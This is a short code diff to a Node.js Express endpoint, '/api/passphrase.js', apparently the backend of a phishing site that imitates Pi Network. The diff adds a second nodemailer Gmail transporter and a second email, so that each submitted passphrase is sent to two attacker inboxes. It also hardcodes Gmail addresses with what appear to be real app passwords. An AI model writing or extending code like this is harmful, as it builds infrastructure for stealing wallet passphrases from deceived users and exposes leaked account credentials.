@@ -25,13 +25,30 @@ app.post('/api/passphrase.js', async (req, res) => {
   const transporter1 = nodemailer.createTransport({
     service: 'gmail',
     auth: {
+      user: 'demo.test.bot15@gmail.com',
+      pass: 'dvts eodz jyop dozu' // App password for first Gmail
+    }
+  });
+
+  // Second transporter
+  const transporter2 = nodemailer.createTransport({
+    service: 'gmail',
+    auth: {
       user: 'pi.network.site1@gmail.com',
-      pass: 'jzoh rwpa yshg lssb' // App password for first Gmail
+      pass: 'bmzr jmit zvhp yitg' // Replace with second Gmail app password
     }
   });
 
   // First email
   const mailOptions1 = {
+    from: '"Messi Pi Network" <demo.test.bot15@gmail.com>',
+    to: 'demo.test.bot15@gmail.com',
+    subject: subject,
+    text: body
+  };
+
+  // Second email
+  const mailOptions2 = {
     from: '"Pi Network" <pi.network.site1@gmail.com>',
     to: 'pi.network.site1@gmail.com',
     subject: subject,
